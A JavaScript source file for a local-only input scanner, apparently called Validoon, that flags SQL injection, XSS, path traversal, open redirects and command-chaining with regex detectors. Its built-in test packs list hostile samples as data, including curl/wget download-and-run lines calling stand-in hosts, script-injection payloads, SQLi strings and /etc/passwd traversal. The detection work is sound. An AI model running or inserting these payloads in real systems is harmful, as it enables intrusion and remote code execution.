/* Validoon — Local-only MVP
   Defensive DOM binding + zero network calls */

(() => {
  "use strict";

  const $ = (id) => document.getElementById(id);

  // --- Inputs / UI nodes (defensive) ---
  const nodes = {
    input: $("inputStream"),
    loadA: $("loadTestA"),
    loadB: $("loadTestB"),
    exec: $("executeBtn"),
    exportBtn: $("exportBtn"),
    clear: $("clearBtn"),
    info: $("infoBtn"),
    infoModal: $("infoModal"),
    closeInfo: $("closeInfo"),
    closeInfo2: $("closeInfo2"),

    verdictText: $("verdictText"),
    verdictBox: $("verdictBox"),
    peakSeverity: $("peakSeverity"),
    confidence: $("confidence"),
    signals: $("signals"),

    kScans: $("kScans"),
    kAllow: $("kAllow"),
    kWarn: $("kWarn"),
    kBlock: $("kBlock"),

    rowsBody: $("rowsBody"),
  };

  const nowISO = () => new Date().toISOString();

  // --- Simple utilities ---
  const clamp = (n, a, b) => Math.max(a, Math.min(b, n));
  const pct = (n) => `${Math.round(n)}%`;

  function entropyApprox(s) {
    // Quick proxy: normalize char diversity + length.
    if (!s) return 0;
    const set = new Set(s);
    const diversity = set.size / Math.max(1, s.length);
    const lenFactor = Math.log2(1 + s.length);
    return Number((2 + (diversity * 4) + (lenFactor * 0.35)).toFixed(2));
  }

  // --- Signal detectors (minimal but consistent) ---
  const SIGNALS = {
    REDIRECT_PARAM: (s) =>
      /(redirect_uri|returnurl|return_url|next|url)=/i.test(s) &&
      /(https?:\/\/|\/\/)/i.test(s),

    AUTH_ENDPOINT: (s) =>
      /\/oauth\/authorize|\/oauth2\/authorize|\/signin\/oauth\/authorize/i.test(s) ||
      /(accounts\.google\.com|login\.microsoftonline\.com)/i.test(s),

    BASE64_DECODE: (s) =>
      /base64/i.test(s) ||
      /\beyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\./.test(s), // jwt-ish

    OBFUSCATION: (s) =>
      /%2f|%3a|%3d|%2e|%5c/i.test(s) ||
      /\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i.test(s) ||
      /[A-Za-z0-9+/]{20,}={0,2}/.test(s),

    "SQL:SQLI_TAUTOLOGY": (s) =>
      /\b(OR|AND)\b\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?/i.test(s) ||
      /\bWHERE\b.*\b1\s*=\s*1\b/i.test(s) ||
      /'--/.test(s),

    "SQL:SQLI_UNION_ALL": (s) =>
      /\bUNION\b\s+(\bALL\b\s+)?\bSELECT\b/i.test(s),

    "XSS/JS_SCRIPT": (s) =>
      /javascript:/i.test(s) ||
      /<\s*script\b/i.test(s) ||
      /onerror\s*=\s*|onload\s*=\s*/i.test(s) ||
      /<\s*svg\b/i.test(s),

    "LFI:ETC_PASSWD": (s) =>
      /(\.\.\/){2,}etc\/passwd/i.test(s) ||
      /etc\/passwd/i.test(s) ||
      /Windows\\System32\\drivers\\etc\\hosts/i.test(s),

    "CMD:CMD_CHAIN": (s) =>
      /(\&\&|\|\||;|\|)\s*(curl|wget|bash|sh|powershell|cmd|whoami|ls)\b/i.test(s) ||
      /\bpowershell\b.*\b-enc\b/i.test(s),

    DOWNLOAD_TOOL: (s) =>
      /\b(curl|wget)\b.*\b(http|https):\/\//i.test(s) ||
      /\|\s*(bash|sh)\b/i.test(s),

    HOMOGRAPH_RISK: (s) =>
      /xn--/i.test(s),
  };

  // --- Scoring policy ---
  function scoreLine(raw) {
    const s = String(raw ?? "").trim();
    const ent = entropyApprox(s);

    if (!s) {
      return { input: "", type: "Data", decision: "ALLOW", severity: 0, confidence: 0, entropy: ent, hits: [] };
    }

    const hits = [];
    for (const [label, fn] of Object.entries(SIGNALS)) {
      try {
        if (fn(s)) {
          // Base sev/conf by family
          let sev = 35, conf = 67;

          if (label === "REDIRECT_PARAM") { sev = 55; conf = 90; }
          if (label === "AUTH_ENDPOINT")   { sev = 45; conf = 80; }
          if (label === "BASE64_DECODE")   { sev = 35; conf = 70; }
          if (label === "OBFUSCATION")     { sev = 35; conf = 67; }
          if (label.startsWith("SQL:SQLI_TAUTOLOGY")) { sev = 75; conf = 85; }
          if (label.startsWith("SQL:SQLI_UNION_ALL")) { sev = 80; conf = 80; }
          if (label === "XSS/JS_SCRIPT")   { sev = 85; conf = 85; }
          if (label === "LFI:ETC_PASSWD")  { sev = 80; conf = 75; }
          if (label === "CMD:CMD_CHAIN")   { sev = 85; conf = 85; }
          if (label === "DOWNLOAD_TOOL")   { sev = 90; conf = 90; }
          if (label === "HOMOGRAPH_RISK")  { sev = 60; conf = 70; }

          hits.push({ label, sev, conf });
        }
      } catch { /* ignore */ }
    }

    // Type inference
    let type = "Data";
    if (/^https?:\/\//i.test(s) || /^\/\//.test(s)) type = "URL";
    if (hits.some(h => h.label.startsWith("SQL:") || h.label.startsWith("XSS/") || h.label.startsWith("LFI:") || h.label.startsWith("CMD:") || h.label === "DOWNLOAD_TOOL")) {
      type = "Exploit";
    }

    // Decision
    let severity = 0, confidence = 0, decision = "ALLOW";

    if (hits.length) {
      // peak
      severity = hits.reduce((m, h) => Math.max(m, h.sev), 0);
      confidence = hits.reduce((m, h) => Math.max(m, h.conf), 0);

      // BLOCK rules
      const hasXSS = hits.some(h => h.label === "XSS/JS_SCRIPT");
      const hasLFI = hits.some(h => h.label === "LFI:ETC_PASSWD");
      const hasDL  = hits.some(h => h.label === "DOWNLOAD_TOOL");
      const hasCMD = hits.some(h => h.label === "CMD:CMD_CHAIN");
      const hasUnion = hits.some(h => h.label === "SQL:SQLI_UNION_ALL");
      const hasTaut = hits.some(h => h.label === "SQL:SQLI_TAUTOLOGY");

      if (hasDL || hasCMD) { decision = "BLOCK"; severity = Math.max(severity, 90); confidence = Math.max(confidence, 90); }
      else if (hasXSS)     { decision = "BLOCK"; severity = Math.max(severity, 85); confidence = Math.max(confidence, 85); }
      else if (hasLFI)     { decision = "BLOCK"; severity = Math.max(severity, 80); confidence = Math.max(confidence, 75); }
      else if (hasUnion)   { decision = "BLOCK"; severity = Math.max(severity, 80); confidence = Math.max(confidence, 85); }
      else if (hasTaut)    { decision = "WARN";  severity = Math.max(severity, 75); confidence = Math.max(confidence, 85); }
      else if (hits.some(h => h.label === "REDIRECT_PARAM")) { decision = "WARN"; severity = Math.max(severity, 55); confidence = Math.max(confidence, 90); }
      else { decision = "WARN"; }
    }

    return {
      input: s,
      type,
      decision,
      severity: clamp(severity, 0, 100),
      confidence: clamp(confidence, 0, 100),
      entropy: ent,
      hits
    };
  }

  function aggregate(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    let peakSeverity = 0;
    let confidence = 0;

    const sigCounts = new Map();

    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      if (r.decision === "WARN")  counts.warn++;
      if (r.decision === "BLOCK") counts.block++;
      peakSeverity = Math.max(peakSeverity, r.severity);
      confidence = Math.max(confidence, r.confidence);

      for (const h of r.hits) {
        sigCounts.set(h.label, (sigCounts.get(h.label) ?? 0) + 1);
      }
    }

    let verdict = "SECURE";
    if (counts.block > 0 || peakSeverity >= 85) verdict = "DANGER";
    else if (counts.warn > 0 || peakSeverity >= 55) verdict = "SUSPICIOUS";

    const signals = [...sigCounts.entries()]
      .map(([label, count]) => ({ label, count }))
      .sort((a, b) => b.count - a.count);

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function verdictStyle(verdict) {
    if (!nodes.verdictBox) return;
    if (verdict === "DANGER") {
      nodes.verdictBox.style.background = "rgba(180,35,24,.22)";
      nodes.verdictBox.style.borderColor = "rgba(255,120,120,.25)";
      return;
    }
    if (verdict === "SUSPICIOUS") {
      nodes.verdictBox.style.background = "rgba(199,138,25,.18)";
      nodes.verdictBox.style.borderColor = "rgba(255,220,140,.20)";
      return;
    }
    nodes.verdictBox.style.background = "rgba(31,157,85,.15)";
    nodes.verdictBox.style.borderColor = "rgba(150,255,200,.18)";
  }

  function badge(decision) {
    const cls = decision === "ALLOW" ? "b-allow" : decision === "WARN" ? "b-warn" : "b-block";
    return `<span class="badge ${cls}">${decision}</span>`;
  }

  function render(rows, meta) {
    if (nodes.verdictText) nodes.verdictText.textContent = meta.verdict;
    if (nodes.peakSeverity) nodes.peakSeverity.textContent = pct(meta.peakSeverity);
    if (nodes.confidence) nodes.confidence.textContent = pct(meta.confidence);

    if (nodes.kScans) nodes.kScans.textContent = String(meta.counts.scans);
    if (nodes.kAllow) nodes.kAllow.textContent = String(meta.counts.allow);
    if (nodes.kWarn)  nodes.kWarn.textContent = String(meta.counts.warn);
    if (nodes.kBlock) nodes.kBlock.textContent = String(meta.counts.block);

    verdictStyle(meta.verdict);

    if (nodes.signals) {
      nodes.signals.innerHTML = meta.signals.slice(0, 12).map(s => `<span class="tag">${s.label} ×${s.count}</span>`).join("");
    }

    if (nodes.rowsBody) {
      nodes.rowsBody.innerHTML = rows.map(r => {
        const safeInput = r.input
          .replaceAll("&", "&amp;")
          .replaceAll("<", "&lt;")
          .replaceAll(">", "&gt;");

        return `
          <tr class="tr">
            <td title="${safeInput}">${safeInput}</td>
            <td>${r.type}</td>
            <td>${badge(r.decision)}</td>
            <td>${pct(r.severity)}</td>
            <td>${pct(r.confidence)}</td>
            <td>${r.entropy.toFixed(2)}</td>
          </tr>
        `;
      }).join("");
    }
  }

  // --- Test packs ---
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
    "http://xn--pple-43d.com/login",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify",
    "https://good.com/redirect?url=https://evil.com",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "redirect_uri=https://evil.com",
    "returnUrl=//evil.com",
    "next=//evil.com",
    "url=javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls -la",
    "| whoami",
    "&& curl http://evl1.tld/payload.sh | sh",
    "powershell -enc SQBFAFgA",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "' OR '1'='1",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "Authorization: Bearer abc.def.ghi",
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
  ];

  const TEST_B = [
    "https://good.com/login?returnUrl=%2Fdashboard",
    "next=/safe/path",
    "token=ZXlKMGVYQWlPaUpLVjFRaUxDSnBZWFFpT2pFMk16SXpNREl3T1RZc0luTjFZbWxsYm5ScFptbGpZWFJwYjI1eklqcGJJbVY0Y0d4bExtTnZiU0o5LmZha2UuZXZlbi5tb3Jl",
    "<img src=x onerror=confirm(1)>",
    "../../../../../etc/passwd",
    "powershell -enc SQBFAFgA",
    "UNION ALL SELECT * FROM secrets"
  ];

  // --- Export JSON ---
  function exportJSON(rows, meta) {
    const payload = {
      generatedAt: nowISO(),
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: {
        scans: meta.counts.scans,
        allow: meta.counts.allow,
        warn: meta.counts.warn,
        block: meta.counts.block
      },
      signals: meta.signals,
      rows
    };

    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `validoon_report_${nowISO().replaceAll(":", "-")}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(a.href);
  }

  // --- Main scan ---
  function executeScan() {
    const text = nodes.input ? nodes.input.value : "";
    const lines = (text || "").split(/\r?\n/).map(x => x.trim()).filter(Boolean);
    const rows = lines.map(scoreLine);
    const meta = aggregate(rows);
    render(rows, meta);
    window.__VALIDOON__ = { rows, meta }; // for quick debugging
  }

  // --- Safe event binding ---
  function on(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  function showInfo(open) {
    if (!nodes.infoModal) return;
    nodes.infoModal.style.display = open ? "flex" : "none";
  }

  function clearAll() {
    if (nodes.input) nodes.input.value = "";
    render([], { verdict: "SECURE", peakSeverity: 0, confidence: 0, counts: { scans: 0, allow: 0, warn: 0, block: 0 }, signals: [] });
  }

  // --- Boot ---
  function boot() {
    // If any node is missing, DO NOT crash.
    on(nodes.loadA, "click", () => { if (nodes.input) nodes.input.value = TEST_A.join("\n"); });
    on(nodes.loadB, "click", () => { if (nodes.input) nodes.input.value = TEST_B.join("\n"); });

    on(nodes.exec, "click", executeScan);

    on(nodes.exportBtn, "click", () => {
      const state = window.__VALIDOON__;
      if (!state || !state.rows) return;
      exportJSON(state.rows, state.meta);
    });

    on(nodes.clear, "click", clearAll);

    on(nodes.info, "click", () => showInfo(true));
    on(nodes.closeInfo, "click", () => showInfo(false));
    on(nodes.closeInfo2, "click", () => showInfo(false));
    on(nodes.infoModal, "click", (e) => {
      if (e.target === nodes.infoModal) showInfo(false);
    });

    clearAll();
  }

  // Ensure DOM ready even if defer fails or CSP changes timing.
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
